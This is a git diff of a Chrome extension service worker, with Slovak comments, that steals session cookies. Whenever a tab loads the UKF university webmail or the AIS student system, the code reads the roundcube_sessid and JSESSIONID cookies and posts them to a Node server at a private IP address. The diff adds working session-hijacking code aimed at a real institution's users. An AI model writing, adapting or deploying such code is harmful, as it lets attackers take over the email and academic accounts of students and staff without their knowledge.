@@ -1,69 +1,113 @@
-const SERVER_URL = "http://10.0.2.16:3000/sessid"; // IP Node server
+console.log("SERVICE WORKER STARTED");
 
-// konfiguracia sledovanych cookies a domen
+// Adresa Node.js servera prijímajúceho zachytené cookies
+const SERVER_URL = "http://192.168.0.129:3000/sessid";
+
+// Definícia sledovaných aplikácií a ich relačných cookies
+/**
+ * TARGETS:
+ * - webmail (type = simple) - jednoduchá cookie -> cookies.get
+ * - AIS (type = java) - Java aplikácia -> cookies.getAll
+ */
 const TARGETS = [
-    {
-        urlPrefix: "https://studentmail.ukf.sk/",
-        cookieName: "roundcube_sessid"
-    },
-    {
-        urlPrefix: "https://ais2.ukf.sk/ais/",
-        cookieName: "JSESSIONID"
-    }
+  {
+    url: "https://studentmail.ukf.sk",  
+    cookieName: "roundcube_sessid",
+    type: "simple"
+  },
+  {
+    url: "https://ais2.ukf.sk",
+    cookieName: "JSESSIONID",
+    type: "java"
+  }
 ];
 
-// funkcia na ziskanie cookies
-function readCookie(target) {
-    chrome.cookies.get(
-        {
-            url: target.urlPrefix,
-            name: target.cookieName
-        },
-        (cookie) => {
-            if (!cookie) {
-                console.log(`[INFO] Cookie ${target.cookieName} not found for ${target.urlPrefix}`);
-                return;
-            }
+// Získanie cookie podľa typu aplikácie
 
-            sendToServer(target.cookieName, cookie.value);
+function readCookie(target) {
+  console.log("Trying to read cookie:", target.cookieName);
+
+  // Webmail využíva štandardnú cookie
+  if (target.type === "simple") {
+    chrome.cookies.get(
+      {
+        url: target.url,
+        name: target.cookieName
+      },
+      (cookie) => {
+        if (!cookie) {
+          console.log(`[INFO] Cookie ${target.cookieName} NOT FOUND`);
+          return;
         }
+
+        console.log(`[FOUND] ${target.cookieName}`, cookie.value);
+        sendToServer(target.cookieName, cookie.value);
+      }
     );
+  }
+
+  // AiS môže vytvárať viacero JSESSIONID cookies, preto sa prehľadávajú všetky cookies domény
+  if (target.type === "java") {
+    chrome.cookies.getAll(
+      {
+        domain: "ais2.ukf.sk"
+      },
+      (cookies) => {
+        const jsession = cookies.find(c => c.name === "JSESSIONID");
+
+        if (!jsession) {
+          console.log("[INFO] JSESSIONID NOT FOUND on ais2.ukf.sk");
+          return;
+        }
+
+        console.log("[FOUND] JSESSIONID", jsession.value);
+        sendToServer("JSESSIONID", jsession.value);
+      }
+    );
+  }
 }
 
-// odosielanie cookies na Node server 
+// Odoslanie získanej cookie na serverovú časť aplikácie
 function sendToServer(cookieName, value) {
-    fetch(SERVER_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            cookie: cookieName,
-            value: value,
-            timestamp: Date.now()
-        })
+  console.log("Sending to server:", SERVER_URL);
+
+  fetch(SERVER_URL, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      cookie: cookieName,
+      value: value,
+      timestamp: Date.now()
     })
-    .then(() => console.log(`[OK] Sent ${cookieName}:`, value))
+  })
+    .then(() => console.log(`[OK] Sent ${cookieName}`))
     .catch(err => console.error("[ERROR] Sending failed:", err));
 }
 
-// spracovanie tabov
+// Spracovanie aktuálne otvorenej karty
 function handleTab(tab) {
-    if (!tab || !tab.url) return;
+  if (!tab || !tab.url) return;
 
-    for (const target of TARGETS) {
-        if (tab.url.startsWith(target.urlPrefix)) {
-            readCookie(target);
-        }
+  console.log("Current tab URL:", tab.url);
+
+  for (const target of TARGETS) {
+    if (tab.url.startsWith(target.url)) {
+      console.log("Matched tab:", tab.url);
+      readCookie(target);
     }
+  }
 }
 
-// sledovanie zmeny tabov
+// Reakcia na prepnutie medzi kartami
 chrome.tabs.onActivated.addListener(info => {
-    chrome.tabs.get(info.tabId, handleTab);
+  chrome.tabs.get(info.tabId, handleTab);
 });
 
-// kontrola refreshu alebo zmeny URL 
+// Reakcia na načítanie alebo obnovenie stránky
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
-    if (changeInfo.status === "complete") {
-        handleTab(tab);
-    }
+  if (changeInfo.status === "complete") {
+    handleTab(tab);
+  }
 });
